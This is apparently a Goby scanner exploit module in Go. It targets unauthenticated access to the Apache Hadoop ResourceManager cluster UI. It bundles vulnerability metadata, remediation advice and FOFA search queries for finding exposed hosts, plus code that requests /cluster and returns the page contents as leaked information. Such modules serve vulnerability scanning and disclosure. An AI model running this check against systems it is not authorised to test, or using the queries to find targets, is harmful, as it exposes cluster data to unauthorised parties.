package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Description": "<p>Hadoop is a distributed system infrastructure developed by the Apache Foundation. Users can develop distributed programs without understanding the underlying details of distribution. Fully utilize the power of clusters for high-speed computing and storage</p><p>The UI management interface of the ReasourceManager component responsible for managing and scheduling resources is open on port 8080/8088, allowing attackers to access the/cluster directory without authentication. Hackers can manipulate data from multiple directories, such as deleting, downloading, browsing directories, and even executing commands, causing great harm.</p>",
    "Product": "Hadoop",
    "Homepage": "https://hadoop.apache.org/docs/current/hadoop-hdfs-httpfs/index.html",
    "DisclosureDate": "2017-09-30",
    "Author": "Xx101",
    "FofaQuery": "(body=\"/cluster/cluster\" && body=\"All Applications\") || body=\"/jmx?qry=Hadoop:\" || body=\"All Applications\"",
    "Level": "1",
    "Impact": "<p>The UI management interface of the ReasourceManager component responsible for managing and scheduling resources is open on port 8080/8088, allowing attackers to access the/cluster directory without authentication. Hackers can manipulate data from multiple directories, such as deleting, downloading, browsing directories, and even executing commands, causing great harm.</p>",
    "Recommendation": "<p>1. If unnecessary, close the Hadoop web management page</p><p>2. Enable authentication to prevent unauthorized users from accessing</p><p>3. Set up a \"security group\" access control policy to prohibit or restrict trusted IP addresses from accessing the public network through multiple default open ports of Hadoop</p>",
    "References": [
        "https://www.cnblogs.com/cowherd/p/13539512.html"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "leakInformation",
            "show": ""
        }
    ],
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Posttime": "2019-10-08 11:30:56",
    "fofacli_version": "3.10.4",
    "fofascan_version": "0.1.16",
    "status": "0",
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "9.8",
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "GobyQuery": "(body=\"/cluster/cluster\" && body=\"All Applications\") || body=\"/jmx?qry=Hadoop:\" || body=\"All Applications\"",
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "CVEIDs": [
        ""
    ],
    "Translation": {
        "CN": {
            "Name": "Apache Hadoop cluster 未授权访问漏洞",
            "Product": "Hadoop",
            "Description": "<p>Hadoop 是一个由 Apache 基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。</p><p>负责对资源进行同一管理调度的 ReasourceManager 组件的 UI 管理界面开放在 8080/8088 端口，攻击者无需认证即可访问 /cluster 目录 ，黑客可以操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p>",
            "Recommendation": "<p>1、如无必要，关闭 Hadoop Web 管理页面</p><p>2、开启身份验证，防止未经授权用户访问</p><p>3、设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问</p>",
            "Impact": "<p>Apache Hadoop 存在未授权访问漏洞，攻击者无需认证即可访问 /cluster 目录 ，攻击者可以操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。<br><br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Apache Hadoop Cluster Unauthorized Access Vulnerability",
            "Product": "Hadoop",
            "Description": "<p>Hadoop is a distributed system infrastructure developed by the Apache Foundation. Users can develop distributed programs without understanding the underlying details of distribution. Fully utilize the power of clusters for high-speed computing and storage</p><p>The UI management interface of the ReasourceManager component responsible for managing and scheduling resources is open on port 8080/8088, allowing attackers to access the/cluster directory without authentication. Hackers can manipulate data from multiple directories, such as deleting, downloading, browsing directories, and even executing commands, causing great harm.</p>",
            "Recommendation": "<p>1. If unnecessary, close the Hadoop web management page</p><p>2. Enable authentication to prevent unauthorized users from accessing</p><p>3. Set up a \"security group\" access control policy to prohibit or restrict trusted IP addresses from accessing the public network through multiple default open ports of Hadoop</p>",
            "Impact": "<p>The UI management interface of the ReasourceManager component responsible for managing and scheduling resources is open on port 8080/8088, allowing attackers to access the/cluster directory without authentication. Hackers can manipulate data from multiple directories, such as deleting, downloading, browsing directories, and even executing commands, causing great harm.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "Name": "Apache Hadoop Cluster Unauthorized Access Vulnerability",
    "PostTime": "2023-12-11",
    "Is0day": false,
    "CVSSScore": "9.0",
    "PocId": "10899"
}`

	sendPayloadPOSAEJIOPDJPSAOD := func(hostInfo *httpclient.FixUrl) (string, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/cluster")
		postRequestConfig.Header.Store("Accept", "*/*")
		postRequestConfig.Header.Store("Accept-Encoding", "gzip, deflate")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return "", err
		} else if response != nil && response.StatusCode == 200 && strings.Contains(response.Utf8Html, "/cluster/apps/RUNNING") && strings.Contains(response.Utf8Html, "/cluster/nodes") {
			return response.Utf8Html, nil
		}
		return "", err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			responseBody, _ := sendPayloadPOSAEJIOPDJPSAOD(hostInfo)
			return len(responseBody) > 0
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "leakInformation" {
				responseUtf8Body, err := sendPayloadPOSAEJIOPDJPSAOD(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if len(responseUtf8Body) > 0 {
					expResult.OutputType = "html"
					expResult.Output = responseUtf8Body
					expResult.Success = true
					return expResult
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
		},
	))
}
